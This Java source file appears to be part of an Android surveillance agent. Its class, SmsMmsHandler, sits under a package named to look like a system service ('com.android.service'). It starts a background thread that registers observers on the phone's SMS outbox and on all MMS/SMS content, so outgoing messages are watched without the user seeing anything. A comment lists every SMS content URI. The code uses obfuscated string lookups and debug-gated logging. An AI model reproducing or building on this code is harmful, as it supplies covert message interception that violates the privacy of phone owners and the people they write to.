package com.android.service.interfaces;

import android.content.ContentResolver;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;

import com.android.service.Messages;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

public class SmsMmsHandler extends Thread {
	private static final String TAG = "SmsHandler"; //$NON-NLS-1$

	private Handler handler;
	private ContentObserver smsObserver;
	private ContentObserver mmsObserver;
	boolean smsEnabled;
	boolean mmsEnabled;

	public SmsMmsHandler(boolean smsEnabled, boolean mmsEnabled) {
		if (Cfg.DEBUG) {
			Check.requires(smsEnabled || mmsEnabled, " (SmsHandler) Requires failed, no sms neither mms enabled");
		}

		this.smsEnabled = smsEnabled;
		this.mmsEnabled = mmsEnabled;
	}

	@Override
	public void run() {
		Looper.prepare();

		handler = new Handler() {
			@Override
			public void handleMessage(Message msg) {
				// process incoming messages here
				if (Cfg.DEBUG) {
					Check.log(TAG + " (handleMessage): " + msg);
				}
			}
		};

		final ContentResolver cr = Status.getAppContext().getContentResolver();

		/*
		 * I possibili content resolver sono Inbox = "content://sms/inbox"
		 * Failed = "content://sms/failed" Queued = "content://sms/queued" Sent
		 * = "content://sms/sent" Draft = "content://sms/draft" Outbox =
		 * "content://sms/outbox" Undelivered = "content://sms/undelivered" All
		 * = "content://sms/all" Conversations = "content://sms/conversations"
		 * All Conversations = "content://mms-sms/conversations" All messages =
		 * "content://mms-sms" All SMS = "content://sms"
		 */

		// content://sms
		// Messages.getString("25.0") : "content://sms"

		if (smsEnabled) {
			smsObserver = new SmsObserver(handler);
			cr.registerContentObserver(Uri.parse("content://sms/outbox"), true, smsObserver); //$NON-NLS-1$
		}

		if (mmsEnabled) {
			mmsObserver = new MmsObserver(handler);
			cr.registerContentObserver(Uri.parse("content://mms-sms"), true, mmsObserver); //$NON-NLS-1$
		}

		Looper.loop();
	}

	public void quit() {
		if (handler != null) {
			handler.getLooper().quit();
		}
	}
}
